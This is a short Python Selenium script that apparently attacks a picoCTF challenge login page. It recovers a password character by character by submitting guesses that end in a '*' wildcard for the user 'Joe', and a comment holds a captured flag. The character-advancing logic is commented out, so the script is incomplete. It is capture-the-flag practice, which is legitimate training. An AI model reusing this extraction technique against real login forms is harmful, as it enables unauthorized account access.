from selenium import webdriver  # https://selenium-python.readthedocs.io/navigating.html
from time import sleep
from selenium.webdriver import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome()
driver.get('http://jupiter.challenges.picoctf.org:13594/login')

a = 0
pswd_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '{', '}', '_', '-', '(', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
current_pswd = ""
#HTB{d1rectory_h4xx0r_is_k00l}
while True:
#try:
    username = driver.find_element_by_xpath('//*[@id="email"]')
    username.clear()
    username.send_keys('Joe')

    pswd = driver.find_element_by_xpath('//*[@id="password"]')
    pswd.clear()
    pswd.send_keys(current_pswd + pswd_list[a] + "*")
    print(current_pswd + pswd_list[a])

    submit = driver.find_element_by_xpath('/html/body/div/div[3]/div[2]/div/input')
    submit.click()
    a += 1
    """
    except:
        current_pswd = current_pswd + pswd_list[a-1]
        a = 0
        driver.back()
    """
